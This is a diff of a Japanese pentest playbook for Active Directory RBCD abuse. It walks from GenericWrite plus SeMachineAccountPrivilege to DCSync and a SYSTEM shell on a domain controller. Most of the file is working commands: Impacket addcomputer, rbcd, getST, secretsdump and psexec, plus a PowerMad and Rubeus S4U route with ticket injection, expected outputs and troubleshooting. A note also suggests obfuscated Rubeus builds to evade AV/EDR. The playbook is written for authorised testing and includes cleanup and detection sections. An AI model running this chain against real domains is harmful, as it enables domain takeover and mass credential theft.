@@ -8,52 +8,41 @@
 >
 > 実施可否は事前合意で明示確認すること。作成したマシンアカウントの削除、RBCD 属性のクリーンアップが必須。演習環境（HTB / OSCP 等）では制約なし。
 
-## 概要
-
-対象コンピューターオブジェクトへの書き込み権限（GenericAll / GenericWrite）と、ドメインにコンピューターアカウントを追加できる権限（SeMachineAccountPrivilege）を組み合わせて Domain Admin レベルのアクセスを得る攻撃手法。
-
----
+> **スコープ**: GenericAll/GenericWrite + SeMachineAccountPrivilege がある前提での RBCD 攻撃 → DCSync 実行まで。DCSync の手順は `../Credential_Dumping.md` を参照。
 
 ## 着火条件
 
 以下の**両方**が満たされている場合：
 
-1. 現在のユーザーが **対象コンピューター（通常はDC）に GenericAll または GenericWrite** を持つ
-   - BloodHound で確認
-2. 現在のユーザーが **`SeMachineAccountPrivilege`** を持つ（ドメインにコンピューターアカウントを追加できる）
-   - `whoami /all` で確認
+1. 現在のユーザーが **対象コンピューター（通常はDC）に GenericAll または GenericWrite** を持つ（BloodHound で確認）
+2. 現在のユーザーが **`SeMachineAccountPrivilege`** を持つ（`whoami /all` で確認）
+
+## 環境前提
+
+- 実行環境: テスター端末（Linux）から、またはターゲット上の Windows シェルから
+- 必要なツール（Linux ルート）: `impacket-addcomputer`・`impacket-rbcd`・`impacket-getST`・`impacket-secretsdump`（すべてペネトレ用 Linux ディストリ標準搭載）
+- 必要なツール（Windows ルート）: `PowerMad`（GitHub 要）・`Rubeus`（GitHub 要、別途転送）
+- オフライン代替: Linux ルートは DC への LDAP/Kerberos アクセスさえあればネットワーク内完結
+
+## 先に確認すること
+
+- `ms-DS-MachineAccountQuota` の確認（デフォルト 10。0 になっている場合はマシンアカウント作成不可）:
+  ```bash
+  # [Attacker]
+  netexec ldap [DC_IP] -u '[USER]' -p '[PASSWORD]' -M maq
+  ```
+- `/etc/hosts` に DC の FQDN が登録されているか確認（Kerberos は IP ではなく FQDN が必要）
+
+**攻撃者の思考トレース**: `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性に自分が制御するマシンアカウントの SID を書くと、そのアカウントが対象ホストへの S4U 委任を使えるようになる。自分で作ったマシンアカウントを使って DC のサービスチケットを取得 → DCSync が基本フロー。
 
 ---
 
-## 攻撃の原理
+## 1. ルートA: Impacket ベース（Linux 側から完結・推奨）
 
-`msDS-AllowedToActOnBehalfOfOtherIdentity` 属性に「信頼するコンピューターアカウントのSID」を設定することで、そのコンピューターアカウントが対象コンピューターに対してなりすまし（impersonation）を行えるようになる。
-
-攻撃フロー：
-1. 攻撃用コンピューターアカウント（`[CASE_ID]_TEST$`等）を作成
-2. DCの上記属性に `[CASE_ID]_TEST$` のSIDを書き込む
-3. S4U2Self → S4U2Proxy の順で `Administrator` のサービスチケット（TGS）を取得
-4. そのチケットでDCにアクセス → DCSync
-
----
-
-## 実装ルートの選択
-
-**2つの実装ルートがある。手元のシェルの種類で選ぶ：**
-
-| 状況 | 使うルート |
-|------|----------|
-| Linuxのテスター端末から（Windowsシェル不要）| ルートA: Impacket（推奨。ツール依存が少ない） |
-| evil-winrm / psexec 等でWindowsシェル取得済み | ルートB: PowerMad + Rubeus（Windows上で完結） |
-
----
-
-## ルートA: Impacket ベース（Linux側から実行）
-
-### Step 1: コンピューターアカウントを作成
+**コマンド:**
 
 ```bash
-# [Attacker]
+# [Attacker] Step 1: 攻撃用マシンアカウントを作成
 impacket-addcomputer \
   -computer-name '[CASE_ID]_TEST$' \
   -computer-pass '[ATTACKER_CHOSEN_PASSWORD]' \
@@ -61,12 +50,8 @@ impacket-addcomputer \
   '[DOMAIN]/[CURRENT_USER]:[PASSWORD]'
 ```
 
-成功すると：`Successfully added machine account [CASE_ID]_TEST$ with password [ATTACKER_CHOSEN_PASSWORD]`
-
-### Step 2: DCの RBCD 属性を設定
-
 ```bash
-# [Attacker]
+# [Attacker] Step 2: DC の RBCD 属性を設定
 impacket-rbcd \
   -delegate-to '[DC_HOSTNAME]$' \
   -delegate-from '[CASE_ID]_TEST$' \
@@ -75,12 +60,8 @@ impacket-rbcd \
   '[DOMAIN]/[CURRENT_USER]:[PASSWORD]'
 ```
 
-成功すると：`Delegation rights modified successfully!`
-
-### Step 3: Administrator のサービスチケットを取得
-
 ```bash
-# [Attacker]
+# [Attacker] Step 3: Administrator のサービスチケットを取得
 impacket-getST \
   -spn 'cifs/[DC_FQDN]' \
   -impersonate administrator \
@@ -88,18 +69,11 @@ impacket-getST \
   '[DOMAIN]/[CASE_ID]_TEST$:[ATTACKER_CHOSEN_PASSWORD]'
 ```
 
-成功すると `administrator@cifs_[DC_FQDN]@[DOMAIN].ccache` が生成される。
-
-### Step 4: チケットを使って DCSync
-
-**事前準備（必須）：**
+**事前準備（必須）:** チケット取得後に環境変数を設定してから DCSync を実行する。
 
 ```bash
-export KRB5CCNAME=./administrator@cifs_[DC_FQDN]@[DOMAIN].ccache   # [Attacker]
-```
-
-```bash
-# [Attacker]
+# [Attacker] Step 4: チケットを使って DCSync
+export KRB5CCNAME=./administrator@cifs_[DC_FQDN]@[DOMAIN].ccache
 impacket-secretsdump \
   -k -no-pass \
   -just-dc-ntlm \
@@ -107,90 +81,61 @@ impacket-secretsdump \
   administrator@[DC_FQDN]
 ```
 
-### Step 5: Pass-The-Hash で接続
+**観測される出力 → 次のアクション:**
 
-```bash
-# [Attacker]
-evil-winrm -i [DC_IP] -u Administrator -H '[NTLM_HASH]'
-```
+| 出力 | 示唆 | 次のアクション |
+|------|------|--------------|
+| `Successfully added machine account [CASE_ID]_TEST$` | Step 1 成功 | Step 2 に進む |
+| `Delegation rights modified successfully!` | Step 2 成功 | Step 3 に進む |
+| `[*] Saved TGS...` / `administrator@cifs_[DC_FQDN]@...ccache` 生成 | Step 3 成功 | KRB5CCNAME を export して Step 4 に進む |
+| `Administrator:500:...[NTLM_HASH]:::` | DCSync 成功 | `../Credential_Dumping.md` §2 Pass-The-Hash でアクセスを確立 |
+
+**注意:** `-spn 'cifs/[DC_FQDN]'` の FQDN は IP ではなく `[DC_HOSTNAME].[DOMAIN_FQDN]` の完全修飾名にする（Kerberos は IP では通らない）。
 
 ---
 
-## ルートB: PowerMad + Rubeus（Windowsシェル内から実行）
+## 2. ルートB: PowerMad + Rubeus（Windows シェル内から完結）
 
-### 着火条件（ルートBを選ぶ場合）
+Windows シェル取得済み、かつ Impacket が使えない場合（ファイアウォール・Kerberos 設定の問題等）に選ぶ。
 
-evil-winrm 等でターゲットのWindowsシェルを取得しており、
-かつターゲット環境からインターネットにアクセスできないためLinux側ツールが使えない場合や、
-Windowsシェル内で完結させたい場合に選ぶ。
-
-**攻撃者の思考トレース：** ルートAの Impacket が使えない（ファイアウォール・時刻ずれ・Kerberos設定の問題等）とき、
-Windows上の PowerMad と Rubeus で同等の攻撃を完結できる。
-Windows標準モジュール（ActiveDirectory PowerShell）を使うため認証プロトコルの互換性問題が起きにくい。
-
-### 準備：ツールの入手とアップロード
-
-以下の2つを事前にテスター端末に用意し、evil-winrm 経由でアップロードする：
-
-- **PowerMad**（`dirkjanm/PowerMad`）: マシンアカウント作成 PowerShell モジュール。GitHub から取得（インターネット要）
-- **Rubeus**（`GhostPack/Rubeus`）: Kerberos S4U 攻撃用の .NET ツール。GitHub Releases から取得（インターネット要）
+**事前準備（必須）:** テスター端末で `Powermad.ps1` と `Rubeus.exe` を用意し、evil-winrm でアップロードする。
 
 ```bash
-# [Attacker] evil-winrm セッションから順にアップロード
+# [Attacker] evil-winrm セッションからアップロード
 upload Powermad.ps1
 upload Rubeus.exe
 ```
 
-### Step 1: PowerMad でマシンアカウントを作成する
+**コマンド:**
 
 ```powershell
-# [Target] Powermad モジュールをインポート
+# [Target] Step 1: PowerMad でマシンアカウントを作成
 . ./Powermad.ps1
-
-# [Target] 攻撃用マシンアカウントを作成（テスト識別子付きの名前を使う）
 New-MachineAccount -MachineAccount '[CASE_ID]-COMP$' `
   -Password $(ConvertTo-SecureString '[ATTACKER_CHOSEN_PASSWORD]' -AsPlainText -Force)
-# 成功すると: [+] Machine account [CASE_ID]-COMP$ added
-```
 
-作成したアカウントのSIDを確認する（次のステップで必要）：
-
-```powershell
-# [Target]
+# SID を確認（次のステップで必要）
 Get-ADComputer -Identity '[CASE_ID]-COMP$' | Select-Object Name, SID
 ```
 
-### Step 2: DCのRBCD属性を設定する
-
-Windows標準の Active Directory モジュール（DCには通常プリインストール済み）を使う：
-
 ```powershell
-# [Target] DCの PrincipalsAllowedToDelegateToAccount に作成したアカウントを設定
+# [Target] Step 2: DC の RBCD 属性を設定
 Set-ADComputer -Identity [DC_HOSTNAME] `
   -PrincipalsAllowedToDelegateToAccount '[CASE_ID]-COMP$'
 
-# [Target] 設定が反映されたことを確認
+# 設定確認
 Get-ADComputer -Identity [DC_HOSTNAME] -Properties PrincipalsAllowedToDelegateToAccount |
   Select-Object Name, PrincipalsAllowedToDelegateToAccount
 ```
 
-`PrincipalsAllowedToDelegateToAccount` に `CN=[CASE_ID]-COMP$,...` が表示されれば設定成功。
-
-### Step 3: Rubeus でマシンアカウントのパスワードハッシュを計算する
-
-S4U攻撃にはNTLMハッシュ（rc4_hmac）が必要：
-
 ```powershell
-# [Target]
+# [Target] Step 3: Rubeus でパスワードハッシュを計算（S4U に rc4_hmac が必要）
 .\Rubeus.exe hash /password:[ATTACKER_CHOSEN_PASSWORD] /user:'[CASE_ID]-COMP$' /domain:[DOMAIN]
+# 出力の rc4_hmac 値を控える → [RC4_HASH]
 ```
 
-出力の `rc4_hmac` の値を控える（例：`[RC4_HASH]`）。
-
-### Step 4: Rubeus S4U 攻撃でサービスチケットを取得する
-
 ```powershell
-# [Target]
+# [Target] Step 4: S4U 攻撃でサービスチケットを取得
 .\Rubeus.exe s4u `
   /user:'[CASE_ID]-COMP$' `
   /rc4:[RC4_HASH] `
@@ -198,77 +143,53 @@ S4U攻撃にはNTLMハッシュ（rc4_hmac）が必要：
   /msdsspn:'cifs/[DC_FQDN]' `
   /domain:[DOMAIN] `
   /ptt
-```
+# /ptt でチケットが Windows セッションに直接注入される
 
-`/ptt`（Pass-the-Ticket）フラグを指定すると、取得したチケットがそのままWindowsセッションに注入される。
-`[+] Ticket successfully imported!` が出れば成功。
-
-出力の末尾にある Base64 エンコードされたチケット（`doI...` で始まる長い文字列）を控えておく。
-Windowsシェルから直接アクセスできない場合（Linux側のImpacketで使う場合）は次のステップへ。
-
-### Step 5（Windowsセッション内で使う場合）: klist でチケットを確認してアクセスする
-
-```powershell
-# [Target] /ptt で注入したチケットを確認
+# 確認
 klist
-
-# [Target] チケットでDCの管理共有にアクセスできることを確認
 dir \\[DC_FQDN]\C$
 ```
 
-### Step 5（Linux側で使う場合）: チケットをLinuxへ持ち出してpsexecで接続する
-
-Base64チケットをファイルに保存し、Linux側で変換して使う：
+**Linux 側へ持ち出す場合:**
 
 ```bash
-# [Attacker] Rubeus の出力から Base64 チケットをコピーしてファイルに保存
-# ※ 改行・空白を除去してから保存する（cat ticket.kirbi.b64 | tr -d '\n ' > ticket.kirbi.b64 でも可）
-cat > ticket.kirbi.b64 << 'EOF'
-[Rubeusが出力したBase64チケット（改行なしの一行）]
-EOF
-
-# [Attacker] Base64 デコードして kirbi 形式に変換
+# [Attacker] Rubeus の Base64 出力をデコードして ccache に変換
 base64 -d ticket.kirbi.b64 > ticket.kirbi
-
-# [Attacker] Impacket の ticketConverter で ccache 形式に変換
 impacket-ticketConverter ticket.kirbi ticket.ccache
-```
-
-**事前準備（必須）：**
-
-```bash
-export KRB5CCNAME=./ticket.ccache   # [Attacker]
-```
-
-```bash
-# [Attacker] psexec で SYSTEM シェルを取得
+export KRB5CCNAME=./ticket.ccache
 impacket-psexec [DOMAIN]/administrator@[DC_FQDN] -k -no-pass
 ```
 
-`nt authority\system` が返れば RBCD 攻撃成功。
+**観測される出力 → 次のアクション:**
+
+| 出力 | 示唆 | 次のアクション |
+|------|------|--------------|
+| `[+] Machine account [CASE_ID]-COMP$ added` | Step 1 成功 | Step 2 に進む |
+| `CN=[CASE_ID]-COMP$,...` が表示される | Step 2 成功（属性確認） | Step 3 に進む |
+| `[+] Ticket successfully imported!` | Step 4 成功（チケット注入） | `klist` で確認 → `dir \\[DC_FQDN]\C$` でアクセス確立 |
+
+**注意:** Rubeus.exe は多くの AV/EDR でシグネチャ検知される。本番では事前合意の上、難読化ビルドまたは代替手法を検討する。
 
 ---
 
-## トラブルシューティング
+## 刺さらなかったとき
 
-| 症状 | ルート | 原因・対処 |
+| 現象 | ルート | 原因・対処 |
 |------|--------|-----------|
-| `Kerberos SessionError: KRB_AP_ERR_SKEW` | A/B | 時刻のずれ。`sudo ntpdate [DC_IP]`（Linux）または `w32tm /resync`（Windows）で同期 |
-| チケット取得に失敗 | A | FQDN（完全修飾ドメイン名）を使っているか確認。`/etc/hosts` への登録を確認 |
-| `getST` がエラー | A | `-dc-ip` と `-spn` の FQDN が一致しているか確認 |
-| `New-MachineAccount` が失敗 | B | `ms-DS-MachineAccountQuota` が0になっている場合がある。`Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota` で確認 |
-| `Set-ADComputer` が Access Denied | B | 現在のユーザーが対象コンピューターに GenericAll/GenericWrite を持っているか再確認。グループ経由の権限の場合、ログオフ後に再ログインが必要なことがある |
-| Rubeus s4u が `KRB5KDC_ERR_BADOPTION` | B | SPNが存在しないか、DCが委任設定を認識していない。RBCD属性設定後 1〜2 分待ってから再試行する |
-| Base64チケットの変換後に psexec がエラー | B→A | チケットに空白・改行が混入している。`cat ticket.kirbi.b64 \| tr -d ' \n' > ticket_clean.b64` で整形してから再変換 |
+| `KRB_AP_ERR_SKEW` | A/B | 時刻のずれ。`sudo ntpdate [DC_IP]`（Linux）または `w32tm /resync`（Windows）で同期 |
+| チケット取得に失敗 | A | FQDN を使っているか確認。`/etc/hosts` への DC の FQDN 登録を確認 |
+| `New-MachineAccount` が失敗 | B | `ms-DS-MachineAccountQuota` が 0。`Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota` で確認 |
+| `Set-ADComputer` が Access Denied | B | 対象コンピューターへの GenericAll/GenericWrite を再確認。グループ経由の権限の場合ログオフ→再ログインが必要なことがある |
+| Rubeus s4u が `KRB5KDC_ERR_BADOPTION` | B | RBCD 属性設定後 1〜2 分待ってから再試行する |
+| Base64 チケット変換後に psexec がエラー | B→A | チケットに空白・改行が混入。`cat ticket.kirbi.b64 \| tr -d ' \n' > ticket_clean.b64` で整形してから再変換 |
+| `SeMachineAccountPrivilege` がない | A/B | 前提条件不成立。代わりに既存の制御できるマシンアカウントを探す（BloodHound で「WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity」を探す）|
 
 ---
 
 ## 注意点・落とし穴
 
-- `-spn 'cifs/[DC_FQDN]'` の `[DC_FQDN]` は `[DC_HOSTNAME].[DOMAIN_FQDN]` のような完全修飾名にする（IPではKerberosが通らない）
 - `KRB5CCNAME` 環境変数は `export` でセッションに設定する（sudo で実行する場合は `-E` オプション）
-- マシンアカウントの作成上限（デフォルト10台 / ドメイン管理者が変更している場合もある）に達している場合は、既存のマシンアカウントを制御できる場合のみそれを利用する
-- ルートB の Rubeus.exe は多くの AV/EDR で検知される。本番では検知回避手段（難読化ビルド・メモリ内実行等）を事前合意の上で実施する
+- マシンアカウントの作成上限（デフォルト10台）に達している場合は、既存マシンアカウントへの書き込み権限があればそれを利用する
 
 ---
 
@@ -282,17 +203,18 @@ impacket-psexec [DOMAIN]/administrator@[DC_FQDN] -k -no-pass
   - Defender for Identity の RBCD アラート
 - **業務影響リスク**: なし（読み取り操作の組み合わせだが、属性変更による設定汚染が残る）
 - **原状回復必須項目**:
-  - ✅ 作成したマシンアカウント（`[CASE_ID]_TEST$`）の削除
-  - ✅ 対象コンピューターの `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性のクリア（`impacket-rbcd -action remove` または属性をnullに戻す）
+  - ✅ 作成したマシンアカウント（`[CASE_ID]_TEST$` / `[CASE_ID]-COMP$`）の削除
+  - ✅ 対象コンピューターの `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性のクリア（`impacket-rbcd -action remove` または属性を null に戻す）
   - ✅ 取得した `.ccache` チケットファイルの破棄
-  - ✅ DCSync で取得した NTLM ハッシュは Credential_Dumping.md の原状回復項目に従う
+  - ✅ DCSync で取得した NTLM ハッシュは `../Credential_Dumping.md` の原状回復項目に従う
 - **取得情報の取扱**: 取得したチケット・NTLM ハッシュは暗号化保管、テスト完了時破棄
 - **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）
 
 ---
 
 ## 関連技術
+
 - 前：GenericAll の確認 → `../ACE_Abuse/GenericAll.md`
 - 前：BloodHound でパスを発見 → `../../05_Tools_Reference/BloodHound.md`
-- 後：DCSync実行後 → `../Credential_Dumping.md`
-- Unconstrained Delegation との違い → `./Unconstrained.md`
+- 後：DCSync 実行後 → `../Credential_Dumping.md`
+- 関連：Unconstrained Delegation との比較 → `./Unconstrained.md`
